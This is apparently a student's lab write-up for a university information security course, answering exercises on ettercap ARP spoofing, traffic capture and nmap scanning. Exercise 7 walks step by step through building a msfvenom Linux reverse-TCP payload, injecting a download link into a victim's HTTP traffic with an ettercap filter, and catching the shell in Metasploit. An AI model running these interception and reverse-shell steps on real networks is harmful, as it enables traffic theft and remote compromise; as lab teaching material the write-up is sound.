# **Práctica 2 Legislación e Seguridad Informática**

### **1.-Instale el ettercap y pruebe sus opciones básicas en línea de comando.**

   * Instalación de ettercap

         Instalamos con este comando -> apt install ettercap-text-only

   * Opcions interesantes de ettercap(mirar para mais info en https://linux.die.net/man/8/ettercap):

         Estructura do comando -> ettercap [FLAGS] [T1] [T2]

         * FLAGS (poden ir en calquer orden creo e non fai falta usar todos):
     
             |----------------------------------------------------------------------------------------------------------|
             |                                                                                                          |
             |-T / -G -> executar ettercap en modo texto / executar ettercap en unha interfaz GTK2                      |
             |                                                                                                          |
             |Subflag para -T:                                                                                          |
             |-q  -> modo silencioso, non imprime o contido dos paquetes. Interesante si queremos recoller os archivos  |
             | en un .pcap (explicado no ejercicio 2)                                                                   |
             |                                                                                                          |
             |----------------------------------------------------------------------------------------------------------|
             |                                                                                                          |
             |-i <interfaz de red> -> para especificar a interfaz                                                       |
             |                                                                                                          |
             |----------------------------------------------------------------------------------------------------------|
             |                                                                                                          |
             |-w <name file> -> para escribir en un ficheiro con extension .pcap                                        |
             |                                                                                                          |
             |----------------------------------------------------------------------------------------------------------|
             |                                                                                                          |
             |-P <pluging> -> especificar que plugin usar                                                               |
             |                                                                                                          |
             |----------------------------------------------------------------------------------------------------------|
             |                                                                                                          |
             |-M <metodos:argumentos> -> fai un ataque MITM(man in the middle).                                         |
             |                                                                                                          |                                                                                                   
             |Subflags para -M:                                                                                         |
             |arp:remote/oneway -> para facer un arp poisoning(ARP spoofing)                                            |
             |icmp:MAC/IP -> ataque de redireccionamento icmp                                                           |
             |DHCP:ip_pool/netmask/dns -> para un dhcp spoofing                                                         |
             |port:remote/tree -> roubo de puertos                                                                      |
             |                                                                                                          |
             |----------------------------------------------------------------------------------------------------------|

         * T1/T2 -> poden ser direccions MAC, IPs, IPv6 ou puertos

     > Exemplos:
     
     >  ettercap -T -q -i ens33 -M arp:remote //ipvictima/ //ipsalida/

     >  ettercap -T -q -i ens33 -w ettercap.pcap -M arp:remote /ipvictima// /ipsalida//

     >  ettercap -T  -q -P repoison_arp -M arp:remote /ipvictima// /ipsalida//
     
     > IMPORTANTE -> PARA SALIR DE ETTERCAP PULSAMOS A TECLA 'Q', NON SE FAI CTRL+C 

### **2.-Capture paquetería variada de su compañero de prácticas que incluya varias sesiones HTTP. Sobre esta paquetería (puede utilizar el wireshark para los siguientes subapartados)**

   Para capturar a paqueteria da victima, facemos un ataque MITM(o atacante observa e intercepta mensaxes que recibe de todos os movementos da victima).

   Vamos usar ettercap para esnifar a paqueteria do compa, instalar tcpdump para ver a paqueteria que recollemos e wireshark(en local) para visualizar en un ficheiro .pcap(extension usada para 
   captura de paqueteria) a paqueteria esnifada. Instalamos Wireshark na nosa máquina local xa que a de lsi non ten intefaz gráfica.

   Pasos previos antes de facer os subapartados:

   1º) O atacante fai sniffing ao trafico do compañeiro:

       ettercap -T -q -i ens33 -M arp:remote //ipcompa/ //10.11.48.1/ (sniffing da paqueteria)
       
       Mentras esfina, en outro terminal:
       tcpdump -i ens33 -s 65535 -w lsicompa.pcap (para gardar o trafico capturado). 
       [-i] é para espicificar a interfaz.
       [-s] o limite de bytes dos paquetes a capturar.
       [-w] o achivo donde se gardará.

   2º) Mentres o atacante fai o sniffing e garda a paqueteria(tcpdump), a victima busca imagenes,paginas,archivos en http (https non sirve xa que a info está cifrada):

       curl http://w3af.org/
       curl http://www.edu4java.com/_img/web/http.png

   3º) O atacante sale de ettercap con q (si salimos con ctrl+c tiramos ca conexion do compañeiro), fai ctrl+c no terminal onde está o tcpdump e enviamos o archivo á nosa maquina local:

      1º forma -> si temos windows e nos conectamos por ssh con mobaXTerm ou Bitvise SSH con arrastrar o archivo ao noso ordenador xa está.

      2º forma -> si non temos acceso ao noso arbol de directorios da maquina de lsi ou temos Linux executamos -> scp lsi@ipens33 rutaArchivo

  4º) Abrimos Wireshark:

     Arriba en archivos damoslle a abrir e seleccionamos o archivo .pcap e veriamos toda a paqueteria que se capturou co ettercap

  * **Identifique los campos de cabecera de un paquete TCP**

        Na lista da paqueteria buscamos un paquete TCP, pinchamos en un e abaixo ponnos as seguintes lineas:

            Frame 59: 165 bytes on wire (1320 bits), 165 bytes captured (1320 bits)
            Ethernet II, Src: VMware_97:24:d0 (00:50:56:97:24:d0), Dst: VMware_97:d5:d9 (00:50:56:97:d5:d9)
            .
            .
            .
            [SEQ/ACK analysis]
            TCP payload (111 bytes)      

  * **Filtre la captura para obtener el tráfico HTTP**

        Na barra de filtrado poñemos 'http' e veriamos en cada consulta a peticion get para capturar os datos e o codigo da consulta
    
  * **Obtenga los distintos “objetos” del tráfico HTTP (imágenes, pdfs, etc.)**


  * **Visualice la paquetería TCP de una determinada sesión.**

        Vamos a 'analizar' > 'seguir' > secuencia tcp

  * **Sobre el total de la paquetería obtenga estadísticas del tráfico por protocolo como fuente de información para un análisis básico del tráfico.**

        Vamos a 'Estadísticas' > Jerarquia de protocolo

  * **Obtenga información del tráfico de las distintas “conversaciones” mantenidas.**

        Vamos a 'Estadísticas' > Conversaciones

  * **Obtenga direcciones finales del tráfico de los distintos protocolos como mecanismo para determinar qué circula por nuestras redes.**

        Vamos a 'Estadísticas' > Puntos finales


### **3.-Obtenga la relación de las direcciones MAC de los equipos de su segmento.**

  1º forma (hai que instalar nmap):
      
      Executamos -> nmap -sP 10.11.48.0/23
      [nmap] é unha ferramenta que escanea a rede. 
      [-sp] fai un 'ping scan' da ip ou rango de ip que pasemos, neste caso desde o 10.11.48.0 a 10.11.49.255


  2º forma (hai que instalar nast):
      
      Executamos -> nast -m -i ens33 
      [nast] é unha ferramenta que se utiliza para analizar e visualizar o tráfico de rede en tempo real. 
      [-m] mostra en tempo real a lista de hosts dunha LAN.
      [-i] para especificar a interfaz



### **4.-Obtenga la relación de las direcciones IPv6 de su segmento.**

  1º) Executamos o comando -> `ping6 -c 2 -I ens33 ff02::1` , onde [-c 2] quere decir o nº de ping que faremos, [-I] a interfaz e por ultimo a direccion ipv6 multicast(todos os nodos na LAN)
    
  2º) Facemos ->  `ip -6  neigh` . Esto sirve para analizar a cache de ipv6. Si executamos o anterior comando e uns segundos depois, este, indicanos as direccions ipv6 que responderon do noso
      segmento



### **5.-Obtenga el tráfico de entrada y salida legítimo de su interface de red ens33 e investigue los servicios, conexiones y protocolos involucrados.**

  1º) Para ver o noso propio tráfico executamos o comando -> `tcpdump -i ens33 -s 65535 -w meu.pcap`

  2º) Mandamos o archivo.pcap ao noso ordenador local e executamolo en Wireshark



### **6.-Mediante arpspoofing entre una máquina objetivo (víctima) y el router del laboratorio obtenga todas las URL HTTP visitadas por la víctima.**

  1º) Volvemos a coller o archivo lsicompa.pcap do exeercicio 2 (reutilizamos este xa que no ejercicio 2 fixemos tamen un arp poisoning)

  2º) En Wireshark vamos a 'Estadisticas' > 'HTTP' > 'peticiones' e veremos as urls que vimos



### **7.-Instale metasploit. Haga un ejecutable que incluya un Reverse TCP meterpreter payload para plataformas linux. Inclúyalo en un filtro ettercap y aplique toda su sabiduría en ingeniería social para que una                 víctima u objetivo lo ejecute.**

  > Para instalar metasploit -> https://howtoforge.es/como-instalar-metasploit-framework-en-ubuntu-20-04/

  > Aínda que non teñamos entrono gráfico, os pasos de instalación son iguales (acordarse de meter un nombre e un puerto que sea facil saberse)

 ## **Atacante:**

  1º) Creamos o payload -> `msfvenom -p linux/x86/shell/reverse_tcp LHOST=10.11.48.135 LPORT=4096 -f elf > payload.bin` .
  
    Un payload é basicamente unha parte ou un paso que generamos para facer unha accion maliciosa específica despois de que o sistema 
    obxetivo fose infectado. 

    [msfvenom] é a ferramenta de metaspolit que genera payloads.
    
    [-p] indica o tipo de payload que se generará(en este caso linux/x86/shell/reverse_tcp polo que significa que o payload abrirá unha 
    conexión TCP inversa no host especificado).
    
    [LHOST] indica o host onde se generará a conexion(ip do atacante).
    
    [LPORT] indica o porto onde se generará(porto que lle metestes ao metasploit).
    
    [-f] indica o formato de salida do payload(neste caso .elf).
    
    [> payload.bin] esta parter redirige a salida do comando ao archivo "payload.bin".

 2º) Creamos un archivo .filter -> `nano mal.filter`
 
     Indica que se trata de un archivo que contiene reglas o instrucciones para filtrar o procesar datos de acuerdo con ciertos criterios.

     Líneas que meteremos neste archivo:

     if (ip.proto == TCP && tcp.src == 80) {
	      replace("a href", "a href=\"https://tmpfiles.org/dl/207895/payload.bin\">"); #na páxina https://tmpfiles.org/ collemos o payload que generamos antes e metemos no filter o enlace que genera
	      msg("replaced href.\n");
     }

 3º) Procesamos o archivo de filtrado(é como si compilaramos o ett.filter) -> `etterfilter ett.filter -o ig.ef`

     [etterfilter] é unha ferramenta de ettercap que procesa archivos de filtro (os archivos de filtro procesanse para aplicar reglas específicas 
     aos datos ou ao tráfico que se está filtrando).

     [-o] -> especifica o nome do archivo de saíida que se xenerará

 4º) Habilitamos a opcion de reenvios de paquetes IP -> `echo 1 > /proc/sys/net/ipv4/ip_forward`

 5º) Esnifamos a paqueteria da víctima -> `ettercap -T -F ig.ef -i ens33 -q -M arp:remote //10.11.48.118/ //10.11.48.1/` (o flag [-F] carga o filtro compilado)

 6º) Mentras facemos o sniffing, en outro shell executamos o Metasploit e executamos os comandos que aparecen despois de "msf6 >" -> `msfconsole`

       Metasploit tip: Use the analyze command to suggest runnable modules for hosts


              .:okOOOkdc'           'cdkOOOko:.
            .xOOOOOOOOOOOOc       cOOOOOOOOOOOOx.
           :OOOOOOOOOOOOOOOk,   ,kOOOOOOOOOOOOOOO:
          'OOOOOOOOOkkkkOOOOO: :OOOOOOOOOOOOOOOOOO'
         oOOOOOOOO.    .oOOOOoOOOOl.    ,OOOOOOOOoo
         dOOOOOOOO.      .cOOOOOc.      ,OOOOOOOOxx
         lOOOOOOOO.         ;d;         ,OOOOOOOOl1
         .OOOOOOOO.   .;           ;    ,OOOOOOOO..
          cOOOOOOO.   .OOc.     'oOO.   ,OOOOOOOc.
           oOOOOOO.   .OOOO.   :OOOO.   ,OOOOOOo.
            lOOOOO.   .OOOO.   :OOOO.   ,OOOOOl.
             ;OOOO'   .OOOO.   :OOOO.   ;OOOO;.
              .dOOo   .OOOOocccxOOOO.   xOOd..
               ,kOl   .OOOOOOOOOOOOO. .dOk,q
                 :kk;.OOOOOOOOOOOOO.cOk:ee
                   ;kOOOOOOOOOOOOOOOk:xx
                     ,xOOOOOOOOOOOx,cc
                       .lOOOOOOOlcc
                         ,dOd,hh
                          .grg
                            .

       =[ metasploit v6.3.36-dev                          ]
    + -- --=[ 2362 exploits - 1227 auxiliary - 413 post       ]
    + -- --=[ 1388 payloads - 46 encoders - 11 nops           ]
    + -- --=[ 9 evasion                                       ]

    Metasploit Documentation: https://docs.metasploit.com/

    msf6 > use multi/handler
    [*] Using configured payload generic/shell_reverse_tcp
    msf6 exploit(multi/handler) > set payload linux/x86/shell/reverse_tcp
    payload => linux/x86/shell/reverse_tcp
    msf6 exploit(multi/handler) > set LHOST 10.11.48.135
    LHOST => 10.11.48.135
    msf6 exploit(multi/handler) > set LPORT 4096
    LPORT => 4096
    msf6 exploit(multi/handler) > exploit

    [*] Started reverse TCP handler on 10.11.48.135:4096 
    [*] Sending stage (36 bytes) to 10.11.48.118
    [*] Command shell session 1 opened (10.11.48.135:4096 -> 10.11.48.118) at 2023-10-20 23:55:42 +0100

    ls
    Descargas
    Documentos
    Escritorio
    Imágenes
    Música
    Plantillas
    Público
    Vídeos

    

    -------------------------------------------------
    Unha vez que chegamos a este punto xa estamos no shell da victima e podemos executar calquer comando(neste caso executamos ls e 
    sacanos os seus directorios en /home/lsi) 
    Para salir do shell da victima poñemos exit e para salir de metasploit tamen poñemos exit
    Resumen:
    [use multi/handler] -> Este comando configura e activa un manexador (handler) multipropósito. Ecoita e responde a conexións 
    entrantes que se orixinan a través de exploits ou payloads de Metasploit

    [set payload linux/x86/shell/reverse_tcp] -> configura o tipo de payload que se excutará en exploit 

    [set LHOST 10.11.48.135] -> pon como host esa ip
    
    [set LPORT 4096] -> ponse o puerto que se puxo ao instalar metasploit

    [exploit] -> lanza o exploit previamente configurado
    

 ## **CLIENTE:**

 1º) Facemos unha consulta a unha páxina -> `curl http://example.org`

          <!doctype html>
          <html>
          <head>
            <title>Example Domain</title>
            .
            .
            .
            .
        
          <p>This domain is for use in illustrative examples in documents. You may use this
          domain in literature without prior coordination or asking for permission.</p>
          <p><a href="https://tmpfiles.org/dl/207895/payload.bin">="https://www.iana.org/domains/example">More

 > Na última línea aparece o payload

 2º) Simulamos a descarga do payload -> `wget https://tmpfiles.org/dl/207895/payload.bin`

 3º) Damoslle permisos de execucion ao payload.bin que se descargou -> `chmod +x payload.bin`

 4º) Executamos o payload -> `./payload.bin`



### **8.-Haga un MITM en IPv6 y visualice la paquetería**



### **9.-Pruebe alguna herramienta y técnica de detección del sniffing (preferiblemente arpon).**



### **10.-Pruebe distintas técnicas de host discovey, port scanning y OS fingerprinting sobre las máquinas del laboratorio de prácticas en IPv4. Realice alguna de las pruebas de port scanning sobre IPv6.**

* Para IPv4:

   host discovery (para ver todos os hosts da LAN) -> `nmap -sL 10.11.48.0/23`
   
   port scanning para ver todos os puertos abertos de cada máquina da LAN) -> `nmap -sS 10.11.48.0/23`

   OS fingerprinting (para ver o Sistema Operativo das máquinas da LAN) -> `nmap -O 10.11.48.118`

* Para IPv6:

   host discovery -> `nmap -6 -sL 2002:0a0b:3076::1`

   port scanning -> `nmap -6 -sS 2002:0a0b:3076::1`

   OS fingerprinting -> `nmap -6 -O 2002:0a0b:3076::1`

* ¿Coinciden los servicios prestados por un sistema con los de IPv4?.





### **11.-Obtenga información “en tiempo real” sobre las conexiones de su máquina, así como del ancho de banda consumido en cada una de ellas.**

   Instalamos:
	
 	iftop -> utilizase para monitorear o tráfico de red en tiempo real en unha interfaz de rede específica
  	vnstat -> para monitorear e generar estadísticas do uso de ancho de banda da rede
   	tcptrack -> utilizase para facer un seguimento e análisis en tempo real das conexiones TCP na rede.

   Comandos:

   	iftop -i ens33 -> monitorea a interfaz especificada (si se fai un nmap como os do apartado anterior en outro terminal, vemos toda a traza que fai o nmap en tempo real):
    			  - Primeira columna: ip origen
			  - Segunda columna: direccion de tráfico =>(subida) <=(baixada)
			  - Terceira columna: ip destino
			  - Últimas tres columnas: ancho de banda nos últimos 2, 10 e 40 segundos
        
	vnstat -l -i ens33 -> pasados uns minuto salimos con ctrl+c e veremos unha tabla cos resultados que sacou durante a monitorizacion:
 			      rx: tráfico de entrada
	  		      tx: tráfico de salida

        tcptrack -d -i ens33 -> si o executamos e en outro terminal en paralelo facemos un nmap como os do apartado anterior(nmap traballa con TCP) veremos algo parecido a
				o que fai iftop.
   



### **13.-¿Cómo podría hacer un DoS de tipo direct attack contra un equipo de la red de prácticas? ¿Y mediante un DoS de tipo reflective flooding attack?.**



### **14.-Ataque un servidor apache instalado en algunas de las máquinas del laboratorio de prácticas para tratar de provocarle una DoS. Utilice herramientas DoS que trabajen a nivel de aplicación (capa 7). ¿Cómo podría           proteger dicho servicio ante este tipo de ataque? ¿Y si se produjese desde fuera de su segmento de red? ¿Cómo podría tratar de saltarse dicha protección?**








    

     
        

   
     
